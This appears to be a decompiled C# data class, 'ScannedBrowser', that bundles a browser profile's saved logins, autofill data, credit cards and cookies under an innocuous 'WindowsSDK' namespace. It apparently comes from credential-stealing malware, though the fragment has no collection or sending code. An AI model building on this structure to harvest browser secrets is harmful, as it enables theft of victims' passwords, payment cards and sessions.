using System.Collections.Generic;
using System.Runtime.Serialization;

namespace WindowsSDK.Objects.Browsers
{
    [DataContract(Name = "ScannedBrowser", Namespace = "BrowserExtension")]
    public class ScannedBrowser
    {
        [DataMember(Name = "BrowserName")]
        public string BrowserName { get; set; }

        [DataMember(Name = "BrowserProfile")]
        public string BrowserProfile { get; set; }

        [DataMember(Name = "Logins")]
        public IList<Account> Logins { get; set; }

        [DataMember(Name = "Autofills")]
        public IList<Autofill> Autofills { get; set; }

        [DataMember(Name = "CC")]
        public IList<CC> CC { get; set; }

        [DataMember(Name = "Cookies")]
        public IList<ScannedCookie> Cookies { get; set; }

        public bool IsEmpty()
        {
            bool result = true;
            IList<Autofill> autofills = Autofills;
            if (autofills != null && autofills.Count > 0)
            {
                result = false;
            }
            IList<ScannedCookie> cookies = Cookies;
            if (cookies != null && cookies.Count > 0)
            {
                result = false;
            }
            IList<CC> cC = CC;
            if (cC != null && cC.Count > 0)
            {
                result = false;
            }
            IList<Account> logins = Logins;
            if (logins != null && logins.Count > 0)
            {
                result = false;
            }
            return result;
        }
    }
}
